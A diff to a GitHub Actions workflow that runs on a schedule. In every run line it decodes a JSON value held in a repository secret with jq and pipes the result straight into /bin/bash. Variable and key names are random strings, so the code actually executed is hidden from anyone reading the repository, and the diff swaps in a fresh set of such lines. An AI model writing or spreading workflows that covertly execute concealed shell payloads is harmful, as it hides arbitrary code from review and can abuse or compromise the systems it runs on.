@@ -3,7 +3,8 @@ name: chenqinzii
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 2/6 * * *'
+    - cron: '45 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: chenqinzii
         env:
-          dsbm862: ${{ secrets.dsbm862 }}
+          p9: ${{ secrets.p9 }}
         run: |
-          echo $dsbm862 | jq -r .t9 | /bin/bash
-          echo $qlvcx4 | jq -r .ei8 | /bin/bash
-          echo $o81 | jq -r .fazex436 | /bin/bash
-          echo $wsfvm7887 | jq -r .vzwcd4025 | /bin/bash
-          echo $za64 | jq -r .x8105 | /bin/bash
-          echo $cu30 | jq -r .ze862 | /bin/bash
-          echo $gmoiu375 | jq -r .k31 | /bin/bash
-          echo $taxp71 | jq -r .wex3 | /bin/bash
-          echo $xfgsu27346 | jq -r .wkfyk8 | /bin/bash
-          echo $qtb4 | jq -r .zws7893 | /bin/bash
-          echo $eaij1 | jq -r .oix4 | /bin/bash
-          echo $orlhs82 | jq -r .wez1 | /bin/bash
-          echo $i6 | jq -r .la7 | /bin/bash
+          echo $p9 | jq -r .tevpk33 | /bin/bash
+          echo $gfo51 | jq -r .kc95 | /bin/bash
+          echo $mp07 | jq -r .gvgw6546 | /bin/bash
+          echo $akkhz5 | jq -r .s0268 | /bin/bash
+          echo $oyxt50 | jq -r .zf291 | /bin/bash
+          echo $qqoug78 | jq -r .qb8614 | /bin/bash
+          echo $qwi4137 | jq -r .jvj904 | /bin/bash
+          echo $mry680 | jq -r .whtut3075 | /bin/bash
+          echo $bmapz7833 | jq -r .f9774 | /bin/bash
 
